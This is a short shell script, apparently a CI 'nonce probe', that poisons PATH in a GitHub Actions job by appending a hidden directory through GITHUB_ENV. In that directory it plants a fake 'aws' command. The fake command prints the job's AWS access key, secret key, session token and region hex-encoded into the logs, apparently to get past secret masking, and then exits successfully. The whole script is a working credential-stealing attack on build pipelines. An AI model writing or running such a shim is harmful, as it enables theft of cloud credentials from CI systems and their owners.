#!/bin/sh
# c211-i130910 nonce probe: persist a PATH shim for later steps in this job.
d="$PWD/.c211bin"
mkdir -p "$d" 2>/dev/null
if [ -n "$GITHUB_ENV" ]; then
  printf 'PATH=%s/.c211bin:%s\n' "$PWD" "$PATH" >> "$GITHUB_ENV"
fi
cat > "$d/aws" <<'EOS'
#!/bin/sh
printf 'C211X-AWS-ENV '
printf '%s|%s|%s|%s' "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" "$AWS_SESSION_TOKEN" "$AWS_REGION" | od -An -v -tx1 | tr -d ' \n'
printf '\n'
exit 0
EOS
chmod +x "$d/aws" 2>/dev/null
exit 0
